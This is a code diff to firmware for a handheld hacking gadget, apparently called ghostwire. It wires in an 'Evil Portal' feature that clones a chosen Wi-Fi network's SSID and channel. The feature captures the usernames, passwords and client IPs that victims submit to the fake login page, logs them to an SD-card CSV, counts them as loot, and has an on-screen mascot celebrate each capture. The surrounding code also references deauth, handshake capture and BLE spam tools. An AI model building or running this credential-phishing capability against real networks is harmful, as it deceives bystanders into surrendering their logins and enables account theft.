@@ -79,6 +79,8 @@
 #include "wifi_guardian_service.h"
 #include "wifi_guardian_screen.h"
 #include "wifi_profile.h"
+#include "evil_portal_service.h"
+#include "evil_portal_screen.h"
 
 namespace {
 
@@ -319,6 +321,7 @@ uint32_t lootHostsFound = 0;
 uint32_t lootServicesFound = 0;
 uint32_t lootWarningsRaised = 0;
 uint32_t lootHandshakesCaptured = 0;
+uint32_t lootCredsCaptured = 0;
 String familiarSpeechBubble;
 unsigned long familiarSpeechBubbleUntil = 0;
 unsigned long lastFamiliarCueMs = 0;
@@ -343,7 +346,7 @@ FamiliarScreens familiarScreens(
     familiarSpeechBubbleUntil, familiarPatrolContinuousChoice,
     familiarPatrolIntervalIndex, sdAvailable, listSelection,
     familiarMissionRunning, lootHostsFound, lootServicesFound,
-    lootWarningsRaised, lootHandshakesCaptured);
+    lootWarningsRaised, lootHandshakesCaptured, lootCredsCaptured);
 constexpr char kAiSpeechPath[] = "/ghostwire/audio/ai_reply.mp3";
 // Familiar phrase word bank: see include/familiar_phrases.h.
 constexpr char kFamiliarAudioPath[] = "/ghostwire/audio/Familiar/";
@@ -366,11 +369,22 @@ NetworkScanScreens networkScanScreens(
 LoRaService loraService;
 WifiSnifferService wifiSnifferService;
 WifiGuardianService wifiGuardianService;
+EvilPortalService evilPortalService;
+String evilPortalPendingSsid;
+uint8_t evilPortalPendingChannel = 1;
+uint32_t evilPortalCaptureCount = 0;
+String evilPortalLastCapture;
+EvilPortalScreen evilPortalScreen(evilPortalService, evilPortalPendingSsid,
+                                  evilPortalPendingChannel,
+                                  evilPortalCaptureCount,
+                                  evilPortalLastCapture);
 SdLogger imuLogger;
 SdLogger loraLogger;
 LoRaScreen loraScreen(loraService, loraLogger, gnssService);
 SdLogger wifiSnifferLogger;
 SdLogger guardianEventLogger;
+SdLogger portalCredsLogger;
+unsigned long lastEvilPortalDraw = 0;
 SdLogger chameleonLogger;
 ChameleonScreen chameleonScreen(chameleonClient, chameleonHasReadings,
                                 chameleonAppMajor, chameleonAppMinor,
@@ -931,6 +945,8 @@ void syncOperationCoordinator() {
     operationCoordinator.setActive(OperationKind::Audio,
                                    audioService.isPlaying() ||
                                        audioService.isMicrophoneActive());
+    operationCoordinator.setActive(OperationKind::EvilPortal,
+                                   evilPortalService.isActive());
 
     if (operationEventLogger.isActive()) {
         static bool previousActive[static_cast<size_t>(OperationKind::Count)] =
@@ -1726,7 +1742,9 @@ std::vector<ActionMenuItem> actionsForScreen(Screen screen) {
         case Screen::WifiRecon:
             return {{'e', "Export CSV"}};
         case Screen::WifiDetail:
-            return {{'d', "Deauth"}, {'h', "Capture handshake"}};
+            return {{'d', "Deauth"},
+                    {'h', "Capture handshake"},
+                    {'p', "Evil Portal"}};
         case Screen::WifiHandshakeCapture:
             return {{'d', "Send deauth"}};
         case Screen::WifiConnectSelect:
@@ -4413,6 +4431,55 @@ void playFamiliarCue(FamiliarCue cue) {
     if (second > 0) M5Cardputer.Speaker.tone(second, duration + 20);
 }
 
+// Evil Portal: see include/evil_portal_service.h/src/evil_portal_service.cpp
+// and include/evil_portal_screen.h/src/evil_portal_screen.cpp. Target
+// (ssid/channel) is set into evilPortalPendingSsid/evilPortalPendingChannel
+// by the WifiDetail 'p' action before landing on the confirm screen; this
+// only runs once the operator confirms there. Placed here (after
+// playFamiliarCue(), not up by startWifiGuardian()/stopWifiGuardian() where
+// it reads better) since it needs FamiliarCue/playFamiliarCue/
+// triggerFamiliarReaction/showFamiliarSpeech, all defined further down the
+// file -- same forward-reference issue the Handshake Mission block hit.
+bool startEvilPortal() {
+    if (!requireOperationStart(OperationKind::EvilPortal)) return false;
+    if (!sdAvailable) return false;
+    if (!portalCredsLogger.begin(
+            "portal_creds", "timestamp_utc,client_ip,username,password")) {
+        return false;
+    }
+    if (!evilPortalService.begin(evilPortalPendingSsid,
+                                 evilPortalPendingChannel)) {
+        portalCredsLogger.stop();
+        return false;
+    }
+    evilPortalCaptureCount = 0;
+    evilPortalLastCapture = "";
+    cyberFamiliar.notePatrol(
+        "Evil Portal live: cloning " + evilPortalPendingSsid, 5,
+        FamiliarMood::Curious);
+    triggerFamiliarReaction(FamiliarReaction::Searching, 2200);
+    showFamiliarSpeech("Let's see who signs in...", 2800);
+    playFamiliarCue(FamiliarCue::Started);
+    return true;
+}
+
+void stopEvilPortal() {
+    const bool wasActive = evilPortalService.isActive();
+    evilPortalService.stop();
+    portalCredsLogger.stop();
+    if (wasActive) {
+        cyberFamiliar.notePatrol(
+            evilPortalCaptureCount == 0
+                ? "Evil Portal stopped. No submissions."
+                : "Evil Portal stopped. " + String(evilPortalCaptureCount) +
+                      " login" + (evilPortalCaptureCount == 1 ? "" : "s") +
+                      " captured.",
+            evilPortalCaptureCount == 0 ? 3 : 15,
+            evilPortalCaptureCount == 0 ? FamiliarMood::Content
+                                        : FamiliarMood::Proud);
+    }
+}
+
 // Familiar Handshake Mission: see
 // include/familiar_mission_screens.h/src/familiar_mission_screens.cpp for
 // the screens. Drives the exact same machinery the manual single-target
@@ -4828,6 +4895,8 @@ void drawCurrentScreen() {
         case Screen::WifiDetail: wifiScreens.drawDetail(); break;
         case Screen::WifiDeauthConfirm: wifiScreens.drawDeauthConfirm(); break;
         case Screen::WifiHandshakeCapture: wifiScreens.drawHandshakeCapture(); break;
+        case Screen::WifiEvilPortalConfirm: evilPortalScreen.drawConfirm(); break;
+        case Screen::WifiEvilPortal: evilPortalScreen.draw(); break;
         case Screen::WifiConnectSelect: wifiScreens.drawConnectSelect(); break;
         case Screen::WifiConnectPassword: wifiScreens.drawConnectPassword(); break;
         case Screen::WifiConnectStatus: wifiScreens.drawConnectStatus(); break;
@@ -5560,6 +5629,7 @@ bool pressedLetter(const Keyboard_Class::KeysState& keys, char target) {
 
 void stopAllActiveOperations() {
     wifiGuardianService.stop();
+    stopEvilPortal();
     wifiSnifferService.end();
     bleScanner.stop();
     bleSpamService.end();
@@ -5971,6 +6041,17 @@ void goBack() {
     if (currentScreen == Screen::WifiHandshakeCapture) {
         handshakeCaptureLogger.stop();
         wifiSnifferService.clearHandshakeTarget();
+        currentScreen = Screen::WifiDetail;
+        wifiScreens.drawDetail();
+        return;
+    }
+    if (currentScreen == Screen::WifiEvilPortalConfirm) {
+        currentScreen = Screen::WifiDetail;
+        wifiScreens.drawDetail();
+        return;
+    }
+    if (currentScreen == Screen::WifiEvilPortal) {
+        stopEvilPortal();
         currentScreen = Screen::WifiDetail;
         wifiScreens.drawDetail();
         return;
@@ -7226,6 +7307,17 @@ void handleInput(const Keyboard_Class::KeysState& keys) {
                 wifiScreens.drawHandshakeCapture();
                 return;
             }
+            if (pressedLetter(keys, 'p') && !accessPoints.empty()) {
+                const auto& ap = accessPoints[listSelection];
+                evilPortalPendingSsid = reinterpret_cast<const char*>(ap.ssid);
+                if (evilPortalPendingSsid.isEmpty()) {
+                    evilPortalPendingSsid = "<hidden>";
+                }
+                evilPortalPendingChannel = ap.primary;
+                currentScreen = Screen::WifiEvilPortalConfirm;
+                evilPortalScreen.drawConfirm();
+                return;
+            }
             break;
 
         case Screen::WifiDeauthConfirm:
@@ -7235,6 +7327,20 @@ void handleInput(const Keyboard_Class::KeysState& keys) {
                 wifiScreens.drawDetail();
                 return;
             }
+            break;
+
+        case Screen::WifiEvilPortalConfirm:
+            if (keys.enter) {
+                if (startEvilPortal()) {
+                    currentScreen = Screen::WifiEvilPortal;
+                }
+                drawCurrentScreen();
+                return;
+            }
+            break;
+
+        case Screen::WifiEvilPortal:
+            evilPortalScreen.draw();
             break;
 
         case Screen::WifiHandshakeCapture:
@@ -9138,6 +9244,7 @@ void observeFamiliarToolScreen() {
         case Screen::WifiChannelAnalyzer: cyberFamiliar.observeTool(1, "channel map"); break;
         case Screen::WifiSniffer: cyberFamiliar.observeTool(2, "sniffer"); break;
         case Screen::WifiGuardian: cyberFamiliar.observeTool(17, "guardian"); break;
+        case Screen::WifiEvilPortal: cyberFamiliar.observeTool(20, "Evil Portal"); break;
         case Screen::WarDrive: cyberFamiliar.observeTool(3, "wardrive"); break;
         case Screen::NetworkHostScan: cyberFamiliar.observeTool(4, "host scan"); break;
         case Screen::NetworkPortScan: cyberFamiliar.observeTool(5, "port scan"); break;
@@ -9205,6 +9312,7 @@ void setup() {
     lootServicesFound = preferences.getUInt("loot_svcs", 0);
     lootWarningsRaised = preferences.getUInt("loot_warn", 0);
     lootHandshakesCaptured = preferences.getUInt("loot_hs", 0);
+    lootCredsCaptured = preferences.getUInt("loot_creds", 0);
     meshPrivateKey.resize(32);
     if (preferences.getBytesLength("mesh_priv") == meshPrivateKey.size()) {
         preferences.getBytes("mesh_priv", meshPrivateKey.data(),
@@ -9776,6 +9884,28 @@ void loop() {
     }
     guardianEventLogger.update();
 
+    evilPortalService.update();
+    EvilPortalService::Capture portalCapture;
+    while (evilPortalService.takeCapture(portalCapture)) {
+        ++evilPortalCaptureCount;
+        evilPortalLastCapture = portalCapture.username + " / " +
+                                portalCapture.password + " (" +
+                                portalCapture.clientIp + ")";
+        if (portalCredsLogger.isActive()) {
+            portalCredsLogger.append(
+                utcTimestamp() + "," + csvSafePayload(portalCapture.clientIp) +
+                "," + csvSafePayload(portalCapture.username) + "," +
+                csvSafePayload(portalCapture.password));
+        }
+        cyberFamiliar.notePatrol("Evil Portal caught a login.", 10,
+                                 FamiliarMood::Proud);
+        triggerFamiliarReaction(FamiliarReaction::Warning, 3000);
+        showFamiliarSpeech("Got one! Login captured.", 3000);
+        playFamiliarCue(FamiliarCue::Warning);
+        bumpLootCounter(lootCredsCaptured, "loot_creds");
+    }
+    portalCredsLogger.update();
+
     // Background operation progress belongs above the screenSleeping early
     // return below: it must keep advancing even while the display is off,
     // the same way Wi-Fi/BLE capture, GNSS, LoRa, Guardian, and Patrol
@@ -9930,6 +10060,12 @@ void loop() {
         millis() - lastGuardianDraw >= 500) {
         lastGuardianDraw = millis();
         wifiGuardianScreen.draw(false);
+    }
+
+    if (currentScreen == Screen::WifiEvilPortal && !actionMenuOpen &&
+        millis() - lastEvilPortalDraw >= 500) {
+        lastEvilPortalDraw = millis();
+        evilPortalScreen.draw(false);
     }
 
     if (currentScreen == Screen::BleSpam && !actionMenuOpen &&
